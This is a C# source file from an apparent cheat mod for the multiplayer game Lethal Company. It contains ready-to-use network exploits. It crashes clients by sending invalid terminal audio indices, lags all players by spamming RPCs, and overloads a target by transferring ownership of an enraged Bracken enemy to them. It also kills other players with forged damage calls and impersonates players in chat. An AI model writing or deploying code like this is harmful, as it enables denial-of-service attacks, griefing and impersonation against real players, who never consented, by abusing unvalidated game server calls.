using System;
using System.Collections;
using System.Linq;
using GameNetcodeStuff;
using UnityEngine;

namespace LethalMenu.Cheats
{
    public static partial class NetworkCheats
    {
        #region Malicious Exploits (Use Responsibly)

        /// Attempts to crash other players by sending invalid terminal audio index.
        /// NO bounds checking on syncedAudios array - IndexOutOfRangeException.
        /// 
        /// Attempts to crash/lag other players by sending various invalid data.
        /// May cause IndexOutOfRangeException or other issues on clients.
        public static void AttemptTerminalCrash()
        {
            var terminal = UnityEngine.Object.FindObjectOfType<Terminal>();
            if (terminal == null)
            {
                Debug.Log("[NetworkCheats] Terminal not found.");
                return;
            }

            // Send invalid indices that will cause array bounds exception
            terminal.PlayTerminalAudioServerRpc(-1);
            terminal.PlayTerminalAudioServerRpc(int.MaxValue);
            terminal.PlayTerminalAudioServerRpc(-99999);
            Debug.Log("[NetworkCheats] Sent invalid terminal audio indices.");

            // Also try spamming valid audio to annoy
            for (int i = 0; i < 20; i++)
            {
                terminal.PlayTerminalAudioServerRpc(0);
            }
            Debug.Log("[NetworkCheats] Spammed terminal audio.");
        }

        /// Aggressive RPC spam to cause network lag.
        /// Spams multiple RPC types simultaneously.
        public static void LagAllPlayers(int iterations = 50)
        {
            if (LethalMenuMod.Instance != null)
            {
                LethalMenuMod.Instance.StartCoroutine(LagPlayersCoroutine(iterations));
            }
        }

        /// Coroutine that spams various RPCs aggressively to cause lag.
        public static IEnumerator LagPlayersCoroutine(int iterations)
        {
            var hud = HUDManager.Instance;
            var localPlayer = LethalMenuMod.LocalPlayer;
            var terminal = UnityEngine.Object.FindObjectOfType<Terminal>();

            if (localPlayer == null) yield break;

            Debug.Log($"[NetworkCheats] Starting lag spam ({iterations} iterations)...");

            for (int i = 0; i < iterations; i++)
            {
                // Signal translator spam (server-wide notification)
                if (hud != null)
                {
                    hud.UseSignalTranslatorServerRpc($"L{i % 100:D2}");
                }

                // Terminal audio spam
                if (terminal != null)
                {
                    terminal.PlayTerminalAudioServerRpc(0);
                }

                // Ship horn/alarm spam
                if (hud != null && i % 3 == 0)
                {
                    hud.AlarmHornServerRpc();
                }

                // Chat spam with invisible messages
                if (hud != null)
                {
                    hud.AddTextToChatOnServer($"<size=0>{i}</size>");
                }

                // Self-damage spam (causes visual updates for all)
                if (!localPlayer.isPlayerDead && i % 5 == 0)
                {
                    localPlayer.DamagePlayerFromOtherClientServerRpc(0, UnityEngine.Vector3.zero, -1);
                }

                yield return null; // Next frame
            }

            Debug.Log($"[NetworkCheats] Sent ~{iterations * 5} lag packets.");
        }

        /// PROPER Bracken lag attack - transfers enemy ownership to target player
        /// causing massive pathfinding lag on their client.
        /// Requires a Bracken (Flowerman) to be spawned.
        public static void BrackenLagPlayer(PlayerControllerB targetPlayer)
        {
            if (targetPlayer == null || targetPlayer.isPlayerDead)
            {
                Debug.Log("[NetworkCheats] Invalid target player.");
                return;
            }

            // Find a Bracken (FlowermanAI)
            var bracken = UnityEngine.Object.FindObjectOfType<FlowermanAI>();
            if (bracken == null)
            {
                Debug.Log("[NetworkCheats] No Bracken spawned - cannot use this attack.");
                return;
            }

            if (targetPlayer.isInsideFactory)
            {
                Debug.Log("[NetworkCheats] Target must be outside factory for max effect.");
            }

            if (LethalMenuMod.Instance != null)
            {
                LethalMenuMod.Instance.StartCoroutine(BrackenLagCoroutine(targetPlayer, bracken));
            }
        }

        /// Coroutine that performs the Bracken ownership transfer lag attack.
        private static IEnumerator BrackenLagCoroutine(PlayerControllerB targetPlayer, FlowermanAI bracken)
        {
            var localPlayer = LethalMenuMod.LocalPlayer;
            if (localPlayer == null) yield break;

            // Step 1: Take ownership of the Bracken
            Debug.Log("[NetworkCheats] Taking Bracken ownership...");
            for (int i = 0; i < 30; i++)
            {
                if (bracken.currentOwnershipOnThisClient == (int)localPlayer.playerClientId) break;
                bracken.ChangeEnemyOwnerServerRpc(localPlayer.actualClientId);
                yield return null;
            }

            // Step 2: Set Bracken to target the player and enter max anger mode
            bracken.SetMovingTowardsTargetPlayer(targetPlayer);
            bracken.SwitchToBehaviourState(2); // Aggravated/chase mode
            bracken.EnterAngerModeServerRpc(float.MaxValue); // Max anger = constant pathfinding
            bracken.UpdateEnemyPositionServerRpc(targetPlayer.transform.position);

            Debug.Log("[NetworkCheats] Bracken aggravated, transferring ownership to target...");

            // Step 3: Transfer ownership to target player - THIS causes the lag
            // The target's client now has to compute pathfinding for an enraged Bracken
            for (int i = 0; i < 30; i++)
            {
                if (bracken.currentOwnershipOnThisClient == (int)targetPlayer.playerClientId) break;
                bracken.ChangeEnemyOwnerServerRpc(targetPlayer.actualClientId);
                yield return null;
            }

            Debug.Log($"[NetworkCheats] Bracken lag attack executed on {targetPlayer.playerUsername}.");
        }

        /// Lag ALL players using Bracken ownership spam.
        public static void BrackenLagAllPlayers()
        {
            var bracken = UnityEngine.Object.FindObjectOfType<FlowermanAI>();
            if (bracken == null)
            {
                Debug.Log("[NetworkCheats] No Bracken spawned.");
                return;
            }

            if (LethalMenuMod.Instance != null)
            {
                LethalMenuMod.Instance.StartCoroutine(BrackenLagAllCoroutine(bracken));
            }
        }

        private static IEnumerator BrackenLagAllCoroutine(FlowermanAI bracken)
        {
            var localPlayer = LethalMenuMod.LocalPlayer;
            if (localPlayer == null) yield break;

            var players = GetAllPlayers().Where(p => p != localPlayer).ToArray();
            if (players.Length == 0)
            {
                Debug.Log("[NetworkCheats] No other players to lag.");
                yield break;
            }

            // Cycle through all players, transferring Bracken ownership rapidly
            for (int cycle = 0; cycle < 5; cycle++)
            {
                foreach (var player in players)
                {
                    if (player == null || player.isPlayerDead) continue;

                    // Take ownership
                    bracken.ChangeEnemyOwnerServerRpc(localPlayer.actualClientId);
                    yield return null;

                    // Aggravate and teleport to player
                    bracken.SetMovingTowardsTargetPlayer(player);
                    bracken.EnterAngerModeServerRpc(float.MaxValue);
                    bracken.UpdateEnemyPositionServerRpc(player.transform.position);

                    // Transfer to target
                    bracken.ChangeEnemyOwnerServerRpc(player.actualClientId);
                    yield return new WaitForSeconds(0.1f);
                }
            }

            Debug.Log("[NetworkCheats] Bracken lag attack cycled through all players.");
        }

        /// Rapidly toggles ship lights to be annoying (uses coroutine).
        public static void FlickerShipLights()
        {
            if (LethalMenuMod.Instance != null)
            {
                LethalMenuMod.Instance.StartCoroutine(FlickerShipLightsCoroutine());
            }
        }

        /// Coroutine that flickers ship lights repeatedly.
        public static IEnumerator FlickerShipLightsCoroutine()
        {
            var shipLights = UnityEngine.Object.FindObjectOfType<ShipLights>();
            if (shipLights == null) yield break;

            // Flicker lights 30 times with visible delay
            for (int i = 0; i < 30; i++)
            {
                shipLights.SetShipLightsServerRpc(i % 2 == 0);
                yield return new WaitForSeconds(0.15f); // 150ms between toggles for visible flicker
            }

            Debug.Log("[NetworkCheats] Flickered ship lights.");
        }

        /// 
        /// Sends massive damage to kill a player instantly.
        /// 
        public static void InstantKillPlayer(PlayerControllerB target)
        {
            if (target == null || target.isPlayerDead) return;

            var localPlayer = LethalMenuMod.LocalPlayer;
            if (localPlayer == null) return;

            // 100 damage should kill most players
            target.DamagePlayerFromOtherClientServerRpc(100, Vector3.up * 10f, (int)localPlayer.playerClientId);
            Debug.Log($"[NetworkCheats] Instant killed {target.playerUsername}.");
        }

        /// Kill all other players at once.
        public static void MassKillPlayers()
        {
            var players = GetAllPlayers();
            var localPlayer = LethalMenuMod.LocalPlayer;
            if (localPlayer == null) return;

            int killed = 0;
            foreach (var player in players)
            {
                if (player != null && player != localPlayer && !player.isPlayerDead)
                {
                    player.DamagePlayerFromOtherClientServerRpc(100, Vector3.up * 10f, (int)localPlayer.playerClientId);
                    killed++;
                }
            }

            Debug.Log($"[NetworkCheats] Mass killed {killed} players.");
        }

        /// Impersonate another player in chat.
        /// Sends message that appears to be from another player.
        public static void ImpersonateInChat(string message, int playerIndexToImpersonate)
        {
            var hud = HUDManager.Instance;
            if (hud == null) return;

            // Truncate to 50 characters
            if (message.Length > 50)
                message = message.Substring(0, 50);

            // Use the public method with the target player's index
            hud.AddTextToChatOnServer(message, playerIndexToImpersonate);
            Debug.Log($"[NetworkCheats] Sent message as player {playerIndexToImpersonate}.");
        }

        #endregion
    }
}
